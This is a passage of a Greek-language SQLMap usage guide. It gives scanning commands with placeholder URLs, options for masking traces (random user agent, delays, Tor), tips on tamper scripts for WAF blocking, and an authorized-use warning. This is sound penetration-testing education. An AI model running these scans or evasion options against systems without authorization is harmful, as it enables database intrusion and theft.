| `--flush-session` | Εκκαθάριση αποθηκευμένων δεδομένων συνεδρίας του εργαλείου |
| `--output-dir=DIR` | Προσαρμοσμένος κατάλογος αποτελεσμάτων |

---

<a id="section-14"></a>

## 💡 Συμβουλές και καλές πρακτικές

### Συμβουλές απόδοσης

1. **Ξεκινήστε με απλούς ελέγχους**
   ```bash
   # Ξεκινήστε με χαμηλό επίπεδο ελέγχων
   sqlmap -u "URL" --level=1 --batch
   # Αύξηση μόνο αν χρειάζεται και επιτρέπεται
   ```

2. **Χρήση --batch για αυτοματοποίηση**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Περιορίστε τους ελέγχους στις σχετικές τεχνικές**
   ```bash
   # Έλεγχος μόνο με τεχνική UNION
   sqlmap -u "URL" --technique=U
   ```

### Παραδείγματα μεταβολής ιχνών του πρωτοτύπου

1. **Τυχαία επιλογή User-Agent**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Προσθήκη καθυστέρησης**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Χρήση Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Διερεύνηση προβλημάτων

| Πρόβλημα | Ενδεικτική προσέγγιση |
| ------- | ---------- |
| Δεν εντοπίστηκε έγχυση | Εξετάστε προσεκτικά αύξηση των `--level` και `--risk` στο επιτρεπόμενο πλαίσιο |
| Αποκλεισμός από WAF | Εξετάστε τη συμπεριφορά των φίλτρων και τη συμβατότητα των `--tamper` scripts |
| Αργή σάρωση | Μειώστε το `--level` και επιλέξτε συγκεκριμένη `--technique` |
| Προβλήματα σύνδεσης | Ελέγξτε τα `--timeout` και `--retries` |

---

<a id="section-15"></a>

## ⚠️ Πλαίσιο εξουσιοδοτημένης χρήσης

> **ΠΡΟΣΟΧΗ:** Χρησιμοποιείτε το SQLMap μόνο για **εξουσιοδοτημένους ελέγχους**.
> 
> - ✅ Έλεγχοι σε συστήματα που σας ανήκουν
> - ✅ Έλεγχοι με ρητή γραπτή άδεια
> - ✅ Χρήση σε νόμιμους, εξουσιοδοτημένους ελέγχους διείσδυσης
> - ❌ Μην το χρησιμοποιείτε σε συστήματα χωρίς εξουσιοδότηση
> - ❌ Μην το χρησιμοποιείτε για κακόβουλους σκοπούς
> 
> **Η μη εξουσιοδοτημένη πρόσβαση σε συστήματα μπορεί να επιφέρει νομικές κυρώσεις.**

---

<a id="section-16"></a>

## 📚 Πηγές

### Επίσημες πηγές
- [Επίσημος ιστότοπος SQLMap](https://sqlmap.org/)
- [Αποθετήριο SQLMap στο GitHub](https://github.com/sqlmapproject/sqlmap)
- [Τεκμηρίωση SQLMap](https://github.com/sqlmapproject/sqlmap/wiki)

### Υλικό εκμάθησης
- [Οδηγός OWASP για SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [Υλικό PortSwigger για SQL Injection](https://portswigger.net/web-security/sql-injection)

### Σχετικοί οδηγοί
- [Metasploit Framework](../../Metasploit/translations/README.el.md)
- [Meterpreter](../../Metasploit/translations/Meterpreter.el.md)

---

<p align="center">
  <b>💉 Εξασκηθείτε στους ελέγχους SQL Injection!</b><br>
  <i>Κατανοήστε κάθε έλεγχο και τις επιπτώσεις του</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
